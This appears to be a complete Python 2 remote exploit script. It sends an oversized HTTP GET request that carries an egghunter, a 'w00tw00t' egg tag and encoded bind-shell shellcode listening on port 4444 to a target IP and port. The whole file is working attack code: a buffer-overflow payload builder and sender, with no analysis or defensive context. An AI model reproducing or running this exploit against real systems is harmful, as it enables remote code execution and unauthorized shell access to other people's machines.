#!/usr/bin/python

from socket import *
import sys, struct

if len(sys.argv) != 3:
    print "[*] Usage: python %s <ip> <port>" %sys.argv[0]
    sys.exit(0)

host = sys.argv[1]
port = int(sys.argv[2])

hunt = (
"\x66\x81\xCA\xFF\x0F\x42\x52\x6A"
"\x02\x58\xCD\x2E\x3C\x05\x5A\x74"
"\xEF\xB8\x77\x30\x30\x74\x8B\xFA"
"\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7")

# shikata_ga_nai, 368 bytes, shell_bind_tcp, LPORT=4444 -b "\x00\x20\x0a"
shellcode = ("\xd9\xc9\xd9\x74\x24\xf4\xb8\xc1\xa4\x09\xde\x5e\x2b\xc9\xb1"
"\x56\x31\x46\x18\x03\x46\x18\x83\xee\x3d\x46\xfc\x22\x55\x0e"
"\xff\xda\xa5\x71\x89\x3e\x94\xa3\xed\x4b\x84\x73\x65\x19\x24"
"\xff\x2b\x8a\xbf\x8d\xe3\xbd\x08\x3b\xd2\xf0\x89\x8d\xda\x5f"
"\x49\x8f\xa6\x9d\x9d\x6f\x96\x6d\xd0\x6e\xdf\x90\x1a\x22\x88"
"\xdf\x88\xd3\xbd\xa2\x10\xd5\x11\xa9\x28\xad\x14\x6e\xdc\x07"
"\x16\xbf\x4c\x13\x50\x27\xe7\x7b\x41\x56\x24\x98\xbd\x11\x41"
"\x6b\x35\xa0\x83\xa5\xb6\x92\xeb\x6a\x89\x1a\xe6\x73\xcd\x9d"
"\x18\x06\x25\xde\xa5\x11\xfe\x9c\x71\x97\xe3\x07\xf2\x0f\xc0"
"\xb6\xd7\xd6\x83\xb5\x9c\x9d\xcc\xd9\x23\x71\x67\xe5\xa8\x74"
"\xa8\x6f\xea\x52\x6c\x2b\xa9\xfb\x35\x91\x1c\x03\x25\x7d\xc1"
"\xa1\x2d\x6c\x16\xd3\x6f\xf9\xdb\xee\x8f\xf9\x73\x78\xe3\xcb"
"\xdc\xd2\x6b\x60\x95\xfc\x6c\x87\x8c\xb9\xe3\x76\x2e\xba\x2a"
"\xbd\x7a\xea\x44\x14\x02\x61\x95\x99\xd7\x26\xc5\x35\x87\x86"
"\xb5\xf5\x77\x6f\xdc\xf9\xa8\x8f\xdf\xd3\xdf\x97\x11\x07\x8c"
"\x7f\x50\xb7\x23\xdc\xdd\x51\x29\xcc\x8b\xca\xc5\x2e\xe8\xc2"
"\x72\x50\xda\x7e\x2b\xc6\x52\x69\xeb\xe9\x62\xbf\x58\x45\xca"
"\x28\x2a\x85\xcf\x49\x2d\x80\x67\x03\x16\x43\xfd\x7d\xd5\xf5"
"\x02\x54\x8d\x96\x91\x33\x4d\xd0\x89\xeb\x1a\xb5\x7c\xe2\xce"
"\x2b\x26\x5c\xec\xb1\xbe\xa7\xb4\x6d\x03\x29\x35\xe3\x3f\x0d"
"\x25\x3d\xbf\x09\x11\x91\x96\xc7\xcf\x57\x41\xa6\xb9\x01\x3e"
"\x60\x2d\xd7\x0c\xb3\x2b\xd8\x58\x45\xd3\x69\x35\x10\xec\x46"
"\xd1\x94\x95\xba\x41\x5a\x4c\x7f\x71\x11\xcc\xd6\x1a\xfc\x85"
"\x6a\x47\xff\x70\xa8\x7e\x7c\x70\x51\x85\x9c\xf1\x54\xc1\x1a"
"\xea\x24\x5a\xcf\x0c\x9a\x5b\xda")

totaljunk = 5000
buff = "A" * 3677
buff += 'w00tw00t'
buff += shellcode
buff += "\x90" * 50
buff += hunt
buff += "\xeb\xa6\x90\x90"
#buff += struct.pack('<L', 0x004a8a93)		#0x00405329
buff += "D" * (totaljunk - len(buff))
payload = buff

print "[!] Payload size is ", len(payload)
print "[!] Connecting to %s on port %d" % (host,port)
s = socket(AF_INET, SOCK_STREAM)

try:
	s.connect((host,port))
	print "[+] Launching attack.."
	s.send ("GET /" + payload + "HTTP/1.0" + "\x00" + "\r\n\r\n\r\n")
	s.close()
except:
	print "[x] Could not connect to the server x_x"
	sys.exit()
